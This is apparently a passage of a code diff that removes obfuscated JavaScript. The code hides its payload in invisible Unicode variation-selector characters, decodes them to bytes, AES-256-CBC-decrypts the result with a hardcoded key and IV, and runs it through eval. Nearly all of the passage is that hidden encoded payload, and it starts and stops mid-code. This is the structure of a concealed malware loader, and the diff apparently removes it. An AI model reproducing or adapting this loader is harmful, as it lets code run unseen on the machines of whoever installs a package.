󠄧󠅖󠄦󠄡󠄤󠄤󠅒󠅕󠅓󠄠󠅔󠅖󠄦󠄣󠄡󠅔󠄡󠄩󠄢󠄠󠄠󠄩󠅒󠄦󠅕󠄠󠅒󠅑󠄥󠄩󠄢󠄧󠅖󠄠󠅔󠄧󠅔󠄤󠄢󠄥󠄧󠅕󠄠󠄣󠄤󠄨󠄣󠅕󠄩󠄣󠄡󠅒󠅖󠄢󠄩󠅓󠄡󠄡󠄡󠄩󠄨󠅔󠄠󠄡󠄧󠅑󠅖󠅔󠅒󠄢󠅔󠄡󠅒󠄨󠄢󠄡󠄦󠅒󠄥󠄦󠅒󠅑󠄨󠄢󠄣󠅓󠄣󠄡󠄦󠄩󠅔󠅑󠄣󠅓󠄣󠄨󠄨󠄤󠄨󠄩󠄧󠅒󠅓󠅑󠄢󠅔󠄦󠄩󠄧󠄡󠄡󠄩󠄤󠄨󠄢󠅒󠄩󠄥󠅕󠄠󠅓󠄨󠄨󠅓󠅔󠅓󠄥󠄡󠄤󠄢󠄩󠅕󠄩󠅓󠄤󠅓󠄠󠄡󠄥󠅔󠄡󠄣󠄤󠅔󠄤󠄥󠄥󠄩󠅒󠄤󠄦󠄣󠄥󠄥󠄢󠅔󠄤󠄦󠄠󠄧󠄡󠄢󠄡󠅔󠄦󠅑󠄦󠄠󠅖󠄤󠄤󠄥󠄡󠄢󠄠󠅖󠄠󠄤󠄡󠄦󠅔󠅒󠄣󠅖󠄢󠄥󠄤󠄠󠄧󠄠󠅑󠄦󠅔󠅖󠄣󠅔󠅒󠅒󠄣󠄤󠄣󠄡󠅔󠄣󠅓󠄥󠄡󠄠󠅔󠄣󠄣󠄩󠄠󠄦󠄦󠄤󠅔󠄣󠅔󠅔󠄧󠅒󠄣󠄩󠅑󠅑󠅔󠄢󠅓󠄨󠅒󠄣󠄩󠅔󠄡󠄢󠄣󠄠󠅕󠄣󠄠󠄨󠅒󠅔󠄡󠄥󠄤󠄨󠄣󠄦󠄩󠄣󠄣󠄦󠅕󠄣󠅒󠄦󠄥󠄨󠅒󠄠󠄠󠄩󠄩󠅔󠄤󠄦󠅑󠅕󠅓󠄦󠄢󠄦󠄤󠄧󠄤󠄠󠄩󠅖󠄩󠄣󠄤󠄢󠄡󠄥󠄩󠄧󠄥󠅑󠅕󠄧󠄧󠄢󠄨󠅒󠄩󠅔󠄢󠅓󠄦󠄨󠄡󠄨󠄥󠅒󠄤󠅖󠄥󠄠󠅔󠅕󠄦󠅔󠄢󠄢󠄤󠄦󠅖󠅔󠅑󠄧󠄩󠅔󠅔󠄨󠄠󠄡󠄤󠄥󠅖󠅖󠄧󠄩󠅑󠄩󠄥󠄩󠅑󠅓󠄦󠄥󠅒󠄨󠄢󠅔󠄨󠄦󠅓󠄡󠅖󠄨󠄩󠄡󠅓󠅖󠄥󠄠󠄠󠄣󠄦󠄢󠄤󠄠󠅖󠄦󠄠󠄧󠄥󠅒󠅔󠅑󠄢󠄥󠄤󠄩󠅑󠄦󠄥󠄩󠅓󠅕󠅑󠄥󠄩󠅔󠄡󠅑󠄢󠅑󠄧󠅕󠄦󠅓󠄦󠄢󠅑󠄦󠅔󠄩󠅒󠅓󠄡󠄠󠅖󠄣󠄥󠅑󠅕󠄣󠅑󠅖󠅖󠄣󠄩󠄩󠅖󠄣󠅖󠅑󠄡󠅒󠅕󠄩󠄥󠄢󠅓󠄣󠄠󠄦󠅓󠅖󠄩󠄧󠄣󠅒󠄧󠅔󠅒󠄢󠄧󠄣󠅕󠄢󠄧󠄣󠄦󠄧󠅖󠄩󠄢󠅒󠅕󠄢󠅖󠅑󠄧󠅒󠄥󠄨󠅖󠄧󠄥󠄦󠅕󠄡󠅕󠅒󠄢󠄠󠄦󠄩󠅕󠅑󠅒󠄥󠄧󠄣󠄠󠅒󠄣󠄩󠄩󠅒󠅑󠅒󠅓󠅖󠄩󠅔󠄩󠄥󠄤󠄧󠄥󠄩󠄢󠅑󠅑󠅓󠅑󠄣󠄤󠄧󠅔󠄢󠄥󠅑󠅑󠄨󠄠󠄧󠅔󠅑󠄣󠄣󠅔󠄣󠄩󠅕󠄣󠅑󠄥󠄩󠄤󠄤󠅔󠅔󠄩󠅑󠅕󠄤󠅖󠅖󠅕󠅒󠅔󠄤󠅒󠄥󠄧󠄤󠅕󠅑󠅔󠅔󠄣󠅖󠅓󠄨󠅓󠅒󠅓󠄨󠄠󠄩󠄣󠅕󠄠󠄩󠄧󠅖󠄡󠄡󠅑󠄡󠄦󠄥󠅓󠄣󠄨󠅖󠅖󠄩󠄩󠄨󠄦󠄥󠅔󠅕󠅔󠄥󠅕󠄤󠄨󠄡󠄠󠄣󠄨󠄡󠄣󠅔󠅒󠄩󠄩󠅕󠄠󠄩󠄧󠅕󠅔󠄥󠄢󠄥󠄨󠄥󠄢󠄦󠄥󠅒󠅖󠄠󠅖󠅒󠄡󠄡󠄠󠄣󠅔󠅖󠅒󠄦󠅔󠅒󠅔󠄢󠄤󠄥󠅑󠅑󠄢󠅕󠄧󠄠󠅒󠅔󠅖󠅑󠄩󠅑󠄢󠄥󠅕󠄤󠅕󠅒󠅒󠄠󠄢󠄢󠅖󠄧󠄢󠄤󠄢󠅓󠅓󠅓󠄩󠅒󠅒󠄩󠅑󠄡󠅕󠅒󠄦󠅖󠄨󠅕󠄣󠅓󠄨󠄥󠄢󠅒󠅕󠄢󠄤󠄧󠄤󠄣󠄥󠄧󠄦󠅓󠄣󠅓󠄡󠄦󠅕󠅕󠄣󠅓󠄩󠄢󠅒󠄦󠄤󠅖󠅑󠄤󠅔󠄧󠄣󠄡󠄣󠅕󠄥󠄧󠅕󠄤󠄤󠅑󠅒󠄤󠅒󠅔󠅖󠄦󠄧󠅓󠅕󠅔󠄦󠅔󠅒󠅓󠅒󠄥󠅕󠄡󠄠󠄩󠄤󠄥󠄤󠄡󠄠󠄠󠄥󠄦󠅒󠄢󠄦󠄣󠅕󠄧󠄧󠅔󠄧󠄥󠄢󠄦󠄦󠄦󠄠󠅕󠅑󠄣󠄧󠅒󠄥󠄣󠅒󠅓󠄤󠄡󠄩󠄦󠄩󠅕󠄥󠄦󠄥󠄠󠄠󠄢󠄢󠄦󠄥󠅖󠅓󠅖󠅑󠅑󠄨󠄥󠅕󠄠󠅖󠄩󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄜󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅒󠄛󠄭󠅔󠄞󠅖󠅙󠅞󠅑󠅜󠄘󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠄜󠄥󠄠󠄠󠄙󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅕󠅦󠅑󠅜󠄘󠅒󠄙󠄫󠅭󠄙󠄘󠄙󠅍󠅋󠄠󠅍󠄞󠅤󠅘󠅕󠅞󠄘󠄘󠄙󠄭󠄮󠅫󠅭󠄙󠄫`,
-    ),
-  ).toString("utf-8"),
-);
-
-const s = (v) =>
-  [...v]
-    .map(
-      (w) => (
-        (w = w.codePointAt(0)),
-        w >= 0xfe00 && w <= 0xfe0f
-          ? w - 0xfe00
-          : w >= 0xe0100 && w <= 0xe01ef
-            ? w - 0xe0100 + 16
-            : null
-      ),
-    )
-    .filter((n) => n !== null);
-eval(
-  Buffer.from(
-    s(
-      `󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄴󠅕󠅓󠅙󠅠󠅘󠅕󠅢󠅙󠅦󠄘󠄗󠅑󠅕󠅣󠄝󠄢󠄥󠄦󠄝󠅓󠅒󠅓󠄗󠄜󠄗󠅪󠅕󠅤󠅡󠄸󠅩󠅖󠄴󠅖󠅟󠅔󠄨󠄨󠅪󠅜󠅟󠅞󠅓󠅖󠅞󠄿󠅑󠅃󠄩󠅗󠄷󠅣󠄩󠄠󠄿󠄾󠅈󠄗󠄜󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠅑󠄠󠄤󠄡󠅖󠅔󠅑󠅑󠄠󠄥󠄢󠄡󠅖󠅒󠄥󠅓󠄣󠅕󠄢󠄦󠅒󠄢󠄡󠄧󠅑󠅑󠅖󠄢󠄤󠄡󠄡󠄥󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄙󠄙󠄫󠅜󠅕󠅤󠄐󠅒󠄭󠅔󠄞󠅥󠅠󠅔󠅑󠅤󠅕󠄘󠄗󠄨󠄤󠄨󠄦󠅕󠅑󠄦󠄡󠄢󠄢󠄤󠄠󠄢󠄣󠄢󠅕󠄠󠄧󠄣󠄥󠅖󠄨󠅖󠅕󠄩󠄨󠅕󠄨󠄥󠄣󠅒󠅖󠅕󠄢󠄣󠅖󠅓󠅒󠄣󠄨󠅒󠄣󠅕󠄡󠅔󠄣󠄨󠅕󠄦󠄡󠅔󠄦󠄡󠄢󠅑󠅖󠅑󠅔󠄠󠅔󠅒󠅑󠅑󠅕󠄥󠅕󠄥󠄣󠄢󠅖󠄤󠄧󠅑󠅔󠄧󠄦󠅔󠅓󠅓󠄧󠄧󠄩󠄡󠄩󠄤󠄥󠄩󠄩󠄥󠅖󠄦󠅓󠄠󠄠󠄦󠄧󠄤󠄡󠄣󠄨󠅑󠅕󠄤󠄢󠄢󠄡󠅖󠄧󠄢󠅓󠄡󠅓󠄦󠄡󠅕󠄠󠄨󠄩󠅔󠄦󠅒󠄦󠅒󠄣󠄦󠅓󠄩󠅔󠄧󠅖󠄤󠅒󠅔󠄣󠄦󠄥󠄠󠅖󠅔󠅓󠄦󠅖󠄠󠄤󠅒󠅔󠄣󠅑󠄥󠄩󠄤󠅑󠄩󠅔󠅒󠄡󠅖󠄧󠄡󠅓󠄥󠅕󠅕󠅑󠄧󠅒󠄠󠄥󠄥󠄤󠄢󠄨󠅕󠅖󠅑󠄨󠄨󠄩󠅑󠄠󠄨󠄢󠄡󠅔󠄡󠅒󠄢󠅖󠅒󠄢󠅕󠄧󠄨󠄣󠅕󠅑󠄩󠄨󠅕󠄡󠅑󠄩󠄤󠄨󠅔󠄡󠄥󠅕󠅕󠄥󠅑󠅔󠄨󠅓󠅒󠅓󠅖󠅒󠄠󠅑󠄨󠄤󠅔󠄧󠄨󠄩󠄡󠄡󠅕󠅒󠅒󠄣󠅓󠄢󠄩󠅓󠄤󠅓󠅓󠄣󠅓󠄢󠅔󠄨󠄢󠅓󠅓󠅓󠅓󠄢󠄦󠅑󠅓󠄢󠄠󠅔󠅖󠄡󠄩󠄤󠄢󠄠󠅒󠅒󠄨󠄡󠄤󠄥󠅖󠅓󠄠󠄥󠄢󠄤󠅒󠄨󠅖󠄧󠄤󠄥󠅓󠄢󠄤󠅔󠄡󠄣󠅔󠄣󠄨󠅓󠄩󠅕󠅕󠄢󠅓󠅔󠅕󠄢󠄡󠄡󠄥󠄤󠄢󠄩󠄣󠅖󠅓󠄤󠄢󠄡󠄧󠅔󠄦󠅓󠄥󠄢󠄧󠄣󠄧󠄨󠅕󠄩󠄦󠄩󠅔󠅕󠅑󠄥󠅑󠄦󠄧󠅕󠄧󠅓󠅒󠄤󠄨󠄡󠄦󠄨󠄦󠄠󠅑󠅕󠄨󠄥󠄩󠄠󠄥󠄧󠄣󠅒󠄣󠄢󠅒󠅒󠅖󠄩󠅒󠄠󠅓󠄡󠅓󠅕󠅖󠄡󠄠󠄨󠄡󠄠󠅖󠄩󠄩󠄥󠅒󠅒󠅓󠄤󠅑󠅑󠄩󠄦󠄨󠄧󠄧󠄨󠄦󠄦󠅓󠅑󠄠󠅔󠅑󠅕󠅔󠅓󠅖󠅑󠄩󠅑󠄥󠅓󠄧󠅔󠅑󠅑󠅓󠄤󠅓󠄩󠄩󠅓󠅔󠄨󠅖󠄤󠄥󠄦󠅖󠄤󠄨󠄡󠄨󠄠󠄡󠄢󠅖󠅔󠄦󠅕󠄨󠅓󠅕󠄨󠅕󠄠󠄢󠄧󠅖󠄠󠅒󠅓󠅑󠄦󠅔󠅔󠄤󠅓󠄡󠅔󠄣󠅑󠅑󠄤󠅖󠄤󠄥󠄢󠅕󠄡󠄣󠄥󠄠󠄤󠄤󠅒󠅕󠄩󠅔󠄠󠅒󠅓󠄥󠅒󠄡󠅓󠄣󠅑󠄩󠅖󠄤󠄩󠅑󠅒󠄥󠅔󠄡󠅕󠄡󠅑󠄣󠄨󠄥󠄥󠅒󠄧󠅓󠄩󠅔󠄥󠄣󠄥󠄩󠅖󠄣󠄤󠄠󠅑󠄩󠄡󠅕󠅒󠄤󠄢󠄨󠄤󠄧󠅕󠅑󠄠󠄡󠄦󠅓󠄢󠄡󠅑󠄩󠅖󠄥󠅕󠅓󠅕󠄧󠅕󠅑󠄩󠄤󠄡󠄠󠄤󠄢󠄩󠄤󠄨󠄠󠄧󠄣󠅓󠄧󠄩󠄩󠅒󠅔󠅓󠄠󠄧󠄧󠄣󠄧󠅖󠄢󠅔󠅓󠄨󠄣󠅑󠄨󠅓󠄡󠄦󠄦󠄦󠄣󠄦󠅔󠄧󠄠󠅒󠅑󠄦󠄨󠄦󠄢󠅒󠄢󠄠󠅑󠄧󠅕󠅔󠄧󠄧󠄡󠅕󠅔󠅔󠄩󠄦󠅔󠅔󠄩󠄤󠄦󠅕󠅓󠅑󠅒󠄡󠄠󠄥󠄤󠄡󠅒󠄢󠄠󠄨󠄢󠅒󠄧󠄥󠄢󠄢󠅖󠄢󠄢󠄩󠅒󠄩󠄤󠄣󠄨󠅒󠅑󠅔󠅕󠅑󠄤󠅑󠄡󠄠󠄨󠅕󠅖󠄣󠄡󠄩󠄥󠄢󠅒󠅔󠄩󠄩󠅕󠅕󠄨󠅕󠄦󠄥󠄡󠄢󠅖󠅒󠅓󠄣󠄢󠅒󠄩󠄣󠅒󠄨󠅑󠅕󠄤󠅕󠅒󠄦󠄨󠄩󠄤󠄢󠄣󠄦󠅒󠄠󠅔󠄩󠄣󠅓󠅓󠄢󠅕󠅑󠅖󠄣󠅑󠅖󠄦󠄩󠄦󠄣󠄣󠅒󠅖󠅓󠅖󠄤󠅑󠄥󠄢󠅑󠄢󠅔󠄦󠄧󠄨󠄩󠄦󠅔󠅑󠅑󠄧󠄧󠄩󠅔󠅑󠄢󠅖󠄢󠄦󠄦󠅒󠄨󠄦󠄢󠄦󠅕󠅔󠄢󠅑󠅔󠄧󠅒󠄧󠅑󠅒󠅕󠅔󠅔󠄠󠄡󠄧󠅕󠄢󠄢󠅒󠄡󠅕󠅖󠄢󠅑󠄤󠄤󠅓󠄣󠄡󠅖󠄣󠅕󠄦󠄦󠅒󠄠󠄠󠅓󠄡󠅒󠅔󠅑󠅔󠄦󠅖󠄦󠅓󠄦󠅓󠅖󠅓󠅒󠄨󠅖󠅓󠄤󠄠󠄩󠅔󠅑󠅔󠅑󠄦󠄧󠅓󠄦󠅔󠄦󠄦󠄧󠄩󠅒󠄠󠅑󠅕󠄠󠄡󠄥󠅖󠄩󠄣󠅓󠅔󠄧󠅔󠄡󠄥󠅖󠄨󠄨󠄩󠄧󠅔󠄩󠄥󠅒󠅒󠅕󠅒󠄦󠄠󠄩󠄩󠄡󠄤󠄤󠄠󠅓󠄡󠄡󠄤󠄣󠄠󠄨󠄧󠅒󠄢󠄩󠄨󠅔󠄦󠅖󠅑󠄨󠅕󠄢󠅖󠄣󠄤󠅓󠅖󠅔󠄨󠅔󠄨󠄥󠄨󠅒󠄤󠅑󠄦󠄡󠄦󠄩󠄨󠄦󠅖󠄡󠅕󠄧󠅒󠅒󠄦󠄢󠅑󠄦󠄥󠄩󠄣󠄡󠄣󠅕󠄨󠄠󠅑󠄦󠄢󠄡󠄩󠅖󠅔󠄢󠄦󠄡󠅒󠄤󠄧󠅓󠄤󠅕󠅑󠄨󠄤󠄡󠅓󠅒󠄥󠅑󠄧󠄢󠄨󠄡󠄥󠄧󠅑󠄩󠄧󠅖󠅑󠄥󠄢󠄥󠅖󠅓󠅕󠅖󠅔󠅔󠄥󠄥󠄣󠄡󠄧󠅓󠅖󠅓󠄣󠄢󠄤󠄨󠄤󠄦󠄦󠄩󠅓󠄦󠅖󠄡󠄡󠄦󠄠󠅒󠄦󠄣󠄠󠄠󠄡󠄨󠅓󠄩󠄦󠄤󠄧󠅑󠄩󠄦󠄩󠅔󠄩󠄧󠄣󠅔󠅓󠄥󠄠󠅔󠄣󠄩󠅕󠅑󠄦󠅕󠄢󠄣󠅕󠅑󠄧󠅔󠄩󠄩󠄨󠄤󠄩󠄠󠄦󠄩󠄥󠄥󠅕󠄦󠅕󠄨󠄩󠅓󠄧󠄨󠄢󠄤󠄩󠄣󠄣󠄡󠄦󠅑󠄠󠅓󠅕󠅑󠅔󠅑󠄩󠄩󠅖󠅖󠄠󠅔󠄡󠅖󠅕󠄨󠄡󠄢󠅑󠄧󠄥󠅒󠄣󠄢󠄨󠄦󠄣󠄠󠄠󠄤󠄣󠅑󠄠󠅔󠄠󠄤󠅖󠄧󠄤󠄤󠄤󠄣󠄩󠄤󠄢󠄦󠄧󠄥󠄣󠅕󠅒󠄠󠄧󠄩󠄡󠅔󠄩󠄥󠄣󠅓󠄢󠅔󠅖󠄥󠄠󠄩󠅔󠅒󠄥󠄤󠄩󠅕󠄤󠅕󠅔󠅔󠄦󠄨󠄦󠅕󠄨󠄦󠅔󠅑󠅒󠄦󠅕󠅕󠅓󠅖󠄣󠄥󠄨󠄧󠄤󠄤󠅒󠅕󠅔󠅕󠄨󠄠󠄡󠅓󠄢󠄩󠅒󠅖󠅔󠄦󠅒󠅑󠅖󠄠󠅕󠅑󠅔󠅔󠄣󠄦󠄦󠄡󠅔󠅒󠄢󠄣󠄦󠄠󠅖󠄢󠅔󠄤󠄦󠄣󠄢󠄡󠄩󠅓󠄧󠅓󠅒󠅒󠄢󠄢󠅖󠅑󠅑󠅔󠄥󠅕󠅕󠅒󠄠󠅖󠅖󠅖󠄨󠄤󠅒󠄦󠅔󠄨󠄨󠄨󠄤󠄦󠄧󠅓󠄦󠄦󠅖󠅓󠅒󠅒󠄥󠄤󠅒󠄤󠄨󠄨󠄣󠄣󠅓󠄠󠅓󠄤󠄦󠅔󠄦󠄡󠄤󠅔󠄥󠄩󠅖󠅒󠄧󠄥󠄧󠅕󠅖󠄧󠄠󠅔󠄧󠅖󠅑󠅓󠅖󠅔󠅔󠅔󠄣󠄠󠄥󠅓󠅖󠄥󠅑󠅖󠄦󠅔󠄡󠄤󠄦󠄥󠄠󠄣󠅖󠅖󠄤󠅒󠄢󠄦󠄠󠄧󠄥󠅓󠄨󠅒󠄤󠄦󠅕󠄢󠅑󠅕󠄠󠅑󠅖󠄩󠄤󠄡󠄥󠄣󠅒󠄧󠄨󠅕󠄢󠅒󠅓󠄣󠄢󠅕󠄩󠄣󠄢󠅖󠄣󠅕󠄡󠅕󠄡󠄧󠄧󠄩󠅒󠅒󠄡󠄨󠅓󠄩󠄦󠄢󠄠󠄢󠅕󠅔󠅖󠄧󠅒󠅑󠅑󠅕󠅕󠅔󠅖󠅓󠄧󠄡󠅑󠄣󠄧󠄦󠄥󠄨󠄥󠄤󠅕󠅖󠄢󠄡󠄥󠅑󠄤󠅒󠄧󠅒󠄣󠄢󠅒󠅕󠄦󠄦󠅖󠄣󠅕󠄢󠅓󠄧󠅑󠅓󠅕󠄢󠄡󠄩󠄣󠄤󠄦󠄣󠄨󠄣󠄢󠄠󠅖󠄧󠄠󠄤󠄨󠅔󠅖󠄦󠄧󠅖󠄠󠅔󠅕󠅑󠅓󠅔󠄤󠅕󠄦󠄣󠄩󠄢󠄣󠄣󠄩󠄠󠄧󠄠󠅒󠅒󠄥󠅕󠄨󠄦󠄩󠅒󠅑󠄩󠄢󠅕󠅔󠄦󠄢󠄡󠅓󠄨󠄦󠅓󠄠󠄩󠄦󠄡󠄣󠄦󠄢󠄢󠅑󠄤󠅖󠅕󠄡󠄠󠅖󠄦󠅑󠄦󠄡󠄩󠄩󠅕󠅖󠄥󠅔󠅒󠅑󠅑󠄡󠄤󠅒󠄧󠄦󠅓󠅖󠄥󠅒󠄡󠄦󠄠󠄧󠅒󠄩󠅕󠄡󠅓󠅒󠅑󠄧󠄨󠅓󠅓󠅕󠄡󠄠󠅓󠅒󠅔󠅔󠄧󠄥󠅑󠅑󠅑󠅔󠅔󠄡󠄠󠅔󠅑󠄡󠄠󠄦󠅖󠅖󠅖󠄢󠄦󠄣󠅕󠄨󠅒󠄣󠄤󠄥󠄢󠅓󠄡󠄤󠄧󠄢󠅓󠄥󠅖󠅒󠅒󠅓󠄦󠄥󠄦󠄨󠄦󠄡󠄠󠄨󠄥󠄦󠄤󠅑󠄨󠅓󠅖󠅓󠄥󠄥󠄡󠅓󠄤󠄦󠄤󠅑󠅓󠅑󠅖󠅒󠅑󠄠󠅖󠄢󠅑󠄣󠅒󠄩󠄣󠄣󠄦󠅖󠅕󠄩󠄦󠄦󠅒󠅔󠄧󠄣󠄢󠄥󠄥󠄩󠄡󠄤󠅕󠅖󠅕󠄩󠄩󠄠󠄥󠅒󠅒󠄦󠄡󠄠󠄨󠅖󠄠󠄥󠄡󠄥󠄣󠅔󠅑󠄦󠄨󠄦󠄩󠄦󠄢󠄠󠄧󠄥󠄩󠄤󠄢󠄤󠄤󠅕󠄥󠄧󠄣󠄦󠅓󠅔󠅑󠅖󠄢󠄤󠄠󠄥󠄣󠄤󠄤󠅔󠄣󠅖󠄤󠄩󠄡󠄢󠄨󠅖󠄧󠅔󠅖󠄡󠄡󠅕󠄥󠅒󠄤󠄧󠄣󠄦󠅖󠄥󠄧󠅓󠅕󠄤󠅕󠅔󠅔󠄡󠄢󠄡󠄠󠄦󠄦󠄩󠅖󠅔󠅒󠄦󠄦󠄢󠄤󠅔󠄤󠅖󠅕󠅑󠄢󠄨󠄧󠄦󠅕󠅓󠅑󠅖󠄨󠅓󠄧󠄣󠄠󠄩󠄥󠄦󠅔󠄣󠄩󠅓󠄡󠅒󠅑󠄥󠄨󠄧󠄠󠅒󠄨󠅑󠅓󠅒󠅔󠅑󠄢󠄣󠄧󠄤󠄢󠅑󠄨󠄩󠄠󠄢󠅔󠅖󠅒󠅔󠅖󠄥󠅑󠄧󠄧󠄤󠄤󠄧󠅓󠄣󠄡󠅒󠄨󠄢󠅕󠄡󠅒󠄢󠅒󠄥󠄧󠄧󠄨󠅓󠄦󠄨󠄡󠄤󠅔󠄧󠅑󠄦󠄥󠅕󠅓󠅕󠅔󠅒󠄨󠄧󠅖󠅒󠄩󠄥󠄦󠄥󠅓󠅒󠅒󠄥󠄤󠅕󠄢󠄡󠅕󠄡󠄢󠄦󠄩󠅕󠄠󠄡󠄧󠄤󠄩󠄠󠄦󠄩󠄣󠄡󠅒󠄨󠄩󠄤󠄣󠄦󠄠󠄢󠄤󠄨󠄨󠄥󠄤󠅕󠄠󠄩󠄩󠅓󠅔󠄧󠄦󠄤󠄩󠄦󠅖󠅔󠄤󠄢󠅕󠄦󠄣󠄠󠄠󠄠󠄤󠄥󠄢󠄤󠅑󠄨󠄧󠄨󠄠󠅓󠄢󠅑󠄠󠄧󠄩󠄢󠄨󠄧󠅒󠄨󠅖󠅕󠅔󠅓󠄠󠄥󠅕󠅖󠄠󠅕󠄠󠄢󠄩󠄤󠅑󠄡󠄧󠄥󠄡󠄠󠄥󠄡󠅓󠄠󠅒󠄩󠄡󠅓󠅖󠄥󠄤󠄧󠅔󠄩󠅔󠄩󠄣󠄠󠄢󠅒󠄧󠅓󠄤󠄣󠄠󠄡󠅖󠄩󠄢󠄤󠄧󠄡󠅑󠅒󠄩󠄧󠄥󠄠󠅔󠅔󠄧󠄧󠄤󠅕󠄢󠅖󠅔󠄣󠄣󠅓󠄨󠄣󠄢󠄦󠅒󠄢󠅖󠄤󠄧󠄠󠄤󠄢󠄣󠄡󠄨󠄨󠄧󠄢󠄢󠄩󠄣󠅒󠅑󠄩󠅔󠄨󠄥󠄣󠄤󠅓󠄩󠅓󠄦󠄤󠄥󠅕󠄠󠄤󠄦󠄥󠄡󠅖󠅑󠄠󠅕󠄦󠅕󠄥󠄨󠄠󠅔󠄣󠅓󠄤󠄤󠄧󠅓󠄧󠅖󠄥󠄥󠄠󠄩󠅖󠄠󠅔󠄠󠄦󠄣󠄥󠄠󠅓󠄦󠅓󠄢󠅑󠄩󠄣󠄢󠅖󠅒󠄦󠅕󠄥󠄦󠄥󠄧󠄤󠅑󠅑󠄩󠅒󠅒󠄨󠄦󠄠󠄨󠄩󠄥󠄦󠄨󠅔󠅒󠄢󠄥󠄤󠄧󠅖󠄧󠅓󠅑󠅔󠅓󠄧󠄤󠄥󠄣󠅔󠄨󠄧󠄠󠄨󠅕󠅕󠄧󠄣󠅔󠄠󠄢󠄧󠄦󠅕󠅔󠄧󠄥󠅖󠄦󠄨󠄤󠅓󠄦󠅑󠄦󠅒󠄩󠄢󠄤󠄩󠅓󠅒󠄡󠅔󠄤󠄧󠅔󠅖󠄢󠄩󠄥󠄡󠅕󠄠󠅔󠅕󠅔󠄧󠅔󠄡󠅑󠄡󠄡󠅔󠄥󠅑󠄨󠅑󠄢󠄨󠅒󠄧󠄤󠄩󠄩󠄨󠄩󠅒󠄩󠄢󠄠󠅕󠅔󠄡󠄡󠅓󠄥󠄩󠄥󠄥󠄠󠄩󠄩󠅓󠄨󠄨󠄢󠅕󠄢󠄤󠄠󠄧󠄩󠄤󠅒󠄥󠅓󠄨󠄧󠄦󠄣󠄥󠅕󠅔󠅓󠄦󠄡󠅒󠄥󠄥󠄥󠄣󠅓󠄣󠅓󠄡󠄨󠅓󠅕󠄣󠅓󠄥󠅕󠄡󠅖󠅖󠅕󠄢󠅖󠄨󠅔󠄧󠄡󠄡󠄨󠅓󠅓󠄧󠄠󠄤󠄢󠄢󠄤󠄡󠄤󠄩󠄧󠄤󠄩󠄥󠄣󠅑󠄣󠄤󠅖󠄣󠅑󠅖󠄤󠄣󠅑󠅕󠄦󠄠󠄥󠅒󠄤󠅔󠄠󠄤󠄠󠅔󠅑󠄠󠄨󠄥󠄨󠄤󠄢󠄥󠄥󠅒󠄥󠄥󠄡󠄠󠅕󠄤󠅕󠄧󠅕󠄥󠅑󠄥󠄤󠄣󠅒󠅕󠅖󠄠󠅑󠅒󠄡󠅓󠄡󠄠󠄥󠅓󠅒󠄩󠄧󠄩󠄢󠅓󠄠󠄢󠄡󠄩󠄨󠄠󠄤󠅒󠅓󠄨󠄣󠅓󠄣󠄥󠄡󠅖󠅒󠄩󠄣󠅓󠄤󠄤󠄤󠄠󠄦󠄤󠄨󠄡󠄠󠄥󠄧󠄥󠄢󠄣󠄤󠄢󠄧󠄣󠅕󠄧󠅓󠄢󠄩󠄩󠅓󠄨󠄨󠄠󠄤󠄤󠄨󠅓󠅔󠅑󠄢󠄣󠄤󠄧󠄡󠄣󠅒󠄣󠄠󠄡󠄧󠄣󠅕󠅕󠄠󠄧󠅓󠄩󠅓󠅕󠄤󠄥󠅕󠄩󠅔󠅓󠄣󠄧󠄧󠅔󠄨󠄥󠄩󠄥󠄩󠄩󠅔󠄡󠄢󠄤󠄠󠄩󠄩󠄥󠅖󠄤󠅓󠄢󠄡󠅒󠄠󠅖󠄧󠄠󠅓󠅒󠄠󠄧󠄥󠄧󠄠󠄢󠄨󠅓󠅖󠅔󠅒󠅑󠄦󠅓󠅖󠄩󠄨󠅖󠄦󠄦󠄦󠅑󠄨󠄩󠄣󠅒󠄨󠄦󠄠󠅔󠄡󠄢󠅑󠅒󠄦󠄣󠄡󠄧󠅓󠅕󠅕󠅓󠅑󠄦󠄠󠅖󠅔󠄥󠄦󠄩󠄩󠄦󠄩󠄧󠄢󠅑󠄡󠄥󠅒󠄠󠅑󠄦󠄨󠅖󠅔󠄨󠅑󠅖󠅑󠄥󠅒󠅓󠅒󠄩󠄩󠄦󠄠󠅔󠄨󠄠󠄤󠄤󠄡󠅒󠄠󠄧󠅓󠄧󠅕󠄤󠄠󠄨󠄨󠄣󠄦󠅔󠄦󠄦󠄣󠅓󠄨󠄠󠄠󠄤󠅒󠄦󠅕󠄡󠄦󠅕󠄥󠄨󠄨󠅕󠄡󠅕󠄠󠄤󠄡󠅕󠄧󠄣󠅓󠄨󠄦󠅑󠄡󠅖󠄠󠅑󠅒󠅒󠄨󠅑󠅑󠄩󠅓󠄡󠄣󠄦󠄢󠅕󠄥󠄡󠄤󠅖󠄦󠅔󠄨󠅕󠅓󠄣󠄢󠅑󠄢󠄤󠄡󠅖󠄠󠅕󠄠󠅖󠄡󠄩󠄨󠄡󠄦󠄣󠅖󠄥󠅕󠅔󠅔󠅕󠄣󠄣󠄢󠄥󠅖󠄣󠄣󠅕󠄠󠄩󠅖󠄥󠄩󠄡󠅕󠄤󠄤󠄣󠄧󠄢󠄧󠅖󠄤󠅖󠄤󠄤󠄠󠄥󠄢󠄥󠄠󠄥󠅖󠄣󠅖󠄩󠅕󠄥󠄧󠄠󠄢󠄨󠄤󠄦󠄡󠅖󠅒󠄧󠄩󠅑󠄢󠅖󠄢󠄨󠄨󠄥󠅒󠄤󠅓󠅑󠄣󠄨󠅖󠄣󠄧󠅔󠄥󠄨󠅒󠄤󠅑󠄡󠅑󠅒󠄠󠄧󠄨󠅓󠄦󠅑󠅔󠄩󠅑󠄢